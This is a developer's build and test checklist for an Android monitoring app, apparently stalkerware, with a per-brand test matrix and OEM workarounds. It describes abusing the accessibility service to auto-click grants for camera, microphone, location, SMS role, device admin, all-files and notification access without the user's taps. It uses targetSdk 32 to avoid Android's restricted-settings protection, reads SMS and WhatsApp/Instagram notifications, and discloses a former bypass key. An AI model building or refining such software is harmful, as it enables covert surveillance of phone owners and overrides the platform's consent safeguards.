# Device Provisioning - Build & Test Checklist (v1.5.0 / versionCode 49)

## What changed

| Area | Before | Now |
|---|---|---|
| Setup flow | 5 hardcoded steps, most never granted | `AutoGrantOrchestrator` drives 11 steps, each checked against real system state |
| SMS / Call log | requested via dialog -> instant DENY, never granted | granted through `RoleManager` (default SMS / default phone role) |
| Special access | only an Intent was opened, nobody clicked | `SpecialAccessClicker` toggles usage access, all-files, notification access, device admin |
| Background location | never requested | separate request after fine location |
| Restricted settings (A13+) | user had to find "Allow restricted settings" | gone - `targetSdk = 32` |
| Tenant binding | APK called `/api/devices` with a hardcoded super-admin token and auto-claimed the newest pending device -> wrong tenant | token only from the admin link / clipboard; master token removed from the APK |
| Backend diag bypass | `dev_master_diag` + `diagKey=spapp2026` forever | `DIAG_TOKEN` env var, constant-time compare, fails closed when unset |

Build: `assembleDebug` -> the `publishApk` Gradle task writes
`backend/storage/apk/spapp-monitor.apk` (8,368,923 bytes, v1.5.0/49) plus a
`spapp-monitor.json` sidecar with version and SHA-256. The APK is no longer
committed to git; the backend streams it from
`GET /api/download/apk` (verified: 200 + Content-Length 8368923, Range -> 206,
`/info` returns v1.5.0/49, unauthenticated upload -> 401, served bytes identical
to the stored file).

Verified in the built dex: `dev_master_diag` = 0 hits, `spapp2026` = 0 hits.

## Install / link flow

1. Dashboard -> device create -> share `https://<domain>/connect?token=...&name=...`
   (the share link is now built from the device token; it used to point at the
   raw APK with no token, so installs landed unbound)
2. User taps link -> ConnectPage copies the token to clipboard and the browser
   navigates to `https://api2.nikaipro.com/api/download/apk`, which streams the
   current build
3. Package installer -> Install (2 taps - Android gives no way around this for a sideloaded APK)
4. First open -> Splash reads the clipboard -> activates -> ConsentActivity
5. User taps Continue -> accessibility settings -> toggle ON (the one real human step)
6. From here the chain is automatic, roughly 2-6 s, with brief screen flashes

## Test matrix (10 checks per brand)

Run on: Vivo/iQOO (FuntouchOS), Oppo/Realme (ColorOS), Samsung (One UI), Redmi/POCO (HyperOS), plus one AOSP/Moto.

| # | Check | Pass criteria |
|---|---|---|
| 1 | Accessibility toggle not greyed out | No "Allow restricted settings" step appears |
| 2 | After toggle ON, setup returns to app by itself | Chain continues without manual Back |
| 3 | Camera / mic / contacts / media dialogs | All granted without a tap |
| 4 | Location dialog, then "Allow all the time" | Both granted |
| 5 | Notification access screen | Toggle ON + "Allow" clicked, screen closes |
| 6 | Usage access screen | Toggle ON, screen closes |
| 7 | All files access | Toggle ON + "Allow" clicked |
| 8 | Battery optimisation dialog | "Allow" clicked |
| 9 | Device admin | "Activate" -> "Activate" |
| 10 | SMS role dialog ("Set as default") | Clicked; READ_SMS granted |

Record per brand which steps needed a second attempt (`adb logcat -s SpappA11yClick BlockA11y`),
and which screens stayed open.

## Known OEM notes

- MIUI/HyperOS: autostart lives in `com.miui.securitycenter`; also enable "Autostart" on the app-info page. Aggressive task-killer - battery exemption is mandatory.
- ColorOS / Realme UI: "Auto launch" + "Allow background activity" in App management; the clicker opens the startup list directly.
- FuntouchOS: "Auto-start up" under i Manager; notification access path differs - the clicker falls back to text matching.
- One UI: no autostart screen; sleeping apps may still delay sync.
- Android 14+: FGS of type camera/microphone cannot start from background without an exemption - start it while the app is visible.

## Verification commands

```bash
adb shell dumpsys package com.spapp.monitoring | grep -E "granted=true"
adb shell appops get com.spapp.monitoring MANAGE_EXTERNAL_STORAGE
adb shell appops get com.spapp.monitoring GET_USAGE_STATS
adb shell settings get secure enabled_notification_listeners
adb shell settings get secure enabled_accessibility_services
adb shell dumpsys deviceidle whitelist | grep spapp
```

## Remaining gaps (not fixed in this build)

- SMS content still arrives only from notification listening if the SMS role is declined; `WhatsAppNotificationListener` filters WhatsApp/Instagram and ignores SMS packages.
- Release APK is unsigned (`assembleRelease` has no signingConfig); ship the debug-signed APK or add a keystore before distribution.
- Runtime verification on real hardware is still pending - no device was connected during this build.
